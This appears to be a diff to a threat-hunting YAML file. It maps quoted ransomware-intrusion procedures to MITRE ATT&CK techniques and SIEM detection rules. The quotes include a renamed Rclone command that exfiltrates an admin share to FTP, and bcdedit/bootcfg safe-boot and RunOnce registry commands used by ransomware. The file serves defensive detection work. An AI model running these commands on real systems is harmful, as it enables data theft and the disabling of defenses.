@@ -556,4 +556,97 @@ analysis:
         - Channel:Sysmon AND EventID:1 AND (OriginalFileName:"AdFind.exe" OR Company:"www\.joeware\.net" OR Product:"AdFind") AND NOT Image:"\\adfind.exe"
         - Channel:EDR AND EventType:(FileCreate OR FileRename OR FileDelete) AND (OriginalFileName:"AdFind.exe" OR Company:"www\.joeware\.net" OR Product:"AdFind") 
           AND NOT FilePath:"\\adfind.exe"
+  quote: >
+    - "The Rclone utility was used to collect information from file shares and to exfiltrate the data."
+      "svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\ServerName\C$\ShareName" ftp1:/DomainName/FILES/C/ShareName"
+  mitre_attack:
+    defense_evasion:
+      - T1036.005 - Masquerading - Match Legitimate Name or Location
+    exfiltration:
+      - T1048 - Exfiltration Over Alternative Protocol
+      - T1567.002 - Exfiltration Over Web Service - Exfiltration to Cloud Storage
+    detection:
+      ideas: >
+        - monitor Rclone tool execution, if it's not a legit tool in your environment. 
+        - monitor renamed Rclone tool execution.
+        - monitor renamed Rclone binary file creation/renaming/deletion using VERSONINFO attributes.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+        file_create:
+          - EDR (minifilter)
+        file_rename:
+          - EDR (minifilter)
+        file_delete:
+          - EDR (minifilter)
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\rclone.exe" OR ProcessCommandLine:"*rclone *") 
+        - Channel:Sysmon AND EventID:1 AND (OriginalFileName:"rclone.exe" OR Company:""*rclone\.org"" OR Product:"Rclone") AND NOT Image:"\\rclone.exe"
+        - Channel:EDR AND EventType:(FileCreate OR FileRename OR FileDelete) AND (OriginalFileName:"rclone.exe" OR Company:""*rclone\.org"" OR Product:"Rclone") 
+          AND NOT FilePath:"\\rclone.exe" 
+      ideas: >
+        - monitor Rclone tool execution with suspicious command-lines.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:"\\rclone.exe" OR ProcessCommandLine:"*rclone *") AND ProcessCommandLine:(*copy* OR *sync* OR *move* OR *copyto* OR *mount*) 
+          AND ProcessCommandLine.keyword:/.*\\\\.*\\(ADMIN|IPC|C)\$.*/ AND ProcessCommandLine:(*http* OR *ftp*)
+        - Channel:Sysmon AND EventID:1 AND (Image:"\\rclone.exe" OR CommandLine:"*rclone *" OR OriginalFileName:"rclone.exe" OR Company:""*rclone\.org"" OR Product:"Rclone") 
+          AND CommandLine.keyword:/.*\\\\.*\\(ADMIN|IPC|C)\$.*/ AND CommandLine:(*http* OR *ftp*)
+      ideas: >
+        - monitor system processes execution from untypical paths. Add more executables of your choice.
+      telemetry:
+        process_create:
+          - Windows EID 4688
+          - Sysmon EID 1
+          - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+      rules: >
+        - Channel:Windows-Security AND EventID:4688 AND NewProcessName:("\\svchost.exe" OR "\\gpupdate.exe" OR "\\taskhostw.exe" OR "\\rundll32.exe" OR "\\sc.exe" OR "\\consent.exe" OR "\\vssvc.exe" OR "\\sethc.exe" OR "\\lsm.exe" OR "\\dwm.exe" OR "\\spoolsv.exe") 
+          AND NOT NewProcessName:("C\:\\Windows\\System32\\" OR "C\:\\Windows\\SysWOW64\\")
+        - Channel:Sysmon AND EventID:1 AND Image:("\\svchost.exe" OR "\\gpupdate.exe" OR "\\taskhostw.exe" OR "\\rundll32.exe" OR "\\sc.exe" OR "\\consent.exe" OR "\\vssvc.exe" OR "\\sethc.exe" OR "\\lsm.exe" OR "\\dwm.exe" OR "\\spoolsv.exe") 
+          AND NOT Image:("C\:\\Windows\\System32\\" OR "C\:\\Windows\\SysWOW64\\")
+  quote: >
+    - "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems."
+  detection:
+    - https://github.com/vadim-hunter/Hunting-for-Procedures/blob/main/Defense%20Evasion/T1197%20-%20BITS%20Jobs/Procedures.yaml
+  quote: >
+    - "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking..."
+    - "bootcfg /raw /a /safeboot:network /id 1 (pre-Vista)"
+    - "bcdedit /set {current} safeboot network" (Vista+)"
+    - "bcdedit /deletevalue {current} safeboot"
+    - "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "*UndoSB" /t REG_SZ /d "bootcfg /raw /fastdetect /id 1"
+  mitre_attack:
+    defense_evasion:
+      - T1562.001 - Impair Defenses - Disable or Modify Tools
+    detection:
+      ideas: >
+        - monitor bootcfg/bcdedit tools execution with "safeboot" option. Multiple alerts of this rule from different hosts in a short time most likely will be a sign of Ransomware attack.
+        - monitor writing bootcfg/bcdedit executables to Windows registry run keys. Add more registry run keys to the rules 3-7 at will.
+    telemetry:
+      process_create:
+        - Windows EID 4688
+        - Sysmon EID 1
+        - EDR (PsSetCreateProcessNotifyRoutine/Ex)
+      registry_value_set:
+        - Windows EID 4657 (SACL)
+        - Sysmon EID 13
+        - EDR (CmRegisterCallback/Ex, Registry API)
+    rules: >
+      - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\bcdedit.exe" OR "\\bootcfg.exe") OR ProcessCommandLine:("*bcdedit *" OR "*bootcfg *")) AND ProcessCommandLine:*safeboot*
+      - Channel:Sysmon AND EventID:1 AND (Image:("\\bcdedit.exe" OR "\\bootcfg.exe") OR CommandLine:("*bcdedit *" OR "*bootcfg *") OR OriginalFileName:("bcdedit.exe" OR "bootcfg.exe") 
+        OR Description:("Boot Configuration Data Editor" OR "BootCfg*")) AND CommandLine:*safeboot*
+      - Channel:Windows-Security AND EventID:4657 AND ObjectName:"*\\Windows\\CurrentVersion\\Run*" AND NewValue:(*bcdedit* OR *bootcfg*)
+      - Channel:Sysmon AND EventID:13 AND TargetObject:"*\\Windows\\CurrentVersion\\Run*" AND Details:(*bcdedit* OR *bootcfg*)
+      - Channel:Windows-Security AND EventID:4688 AND (NewProcessName:("\\powershell.exe" OR "\\pwsh.exe" OR "\\reg.exe") OR ProcessCommandLine:("*powershell *" OR "*pwsh *" OR "*reg *") 
+        AND ProcessCommandLine:("*Set-ItemProperty*" OR "* sp *" OR "*add*") AND ProcessCommandLine:"*\\Windows\\CurrentVersion\\Run*" AND ProcessCommandLine:("*bcdedit *" OR "*bootcfg *")
+      - Channel:Sysmon AND EventID:1 AND (Image:("\\powershell.exe" OR "\\pwsh.exe" OR "\\reg.exe") OR CommandLine:("*powershell *" OR "*pwsh *" OR "*reg *") OR OriginalFileName:("PowerShell.EXE" OR "reg.exe")
+        OR Description:("Windows PowerShell" OR "Registry Console Tool")) AND CommandLine:("*Set-ItemProperty*" OR "* sp *" OR *add*) AND CommandLine:"*\\Windows\\CurrentVersion\\Run*" AND CommandLine:("*bcdedit *" OR "*bootcfg *")
+      - Channel:Windows-Powershell AND EventID:400 AND HostApplication:("*powershell *" OR "*pwsh *") AND HostApplication:("*Set-ItemProperty*" OR "* sp *") 
+        AND HostApplication:"*\\Windows\\CurrentVersion\\Run*" AND HostApplication:("*bcdedit *" OR "*bootcfg *") 
+         
           
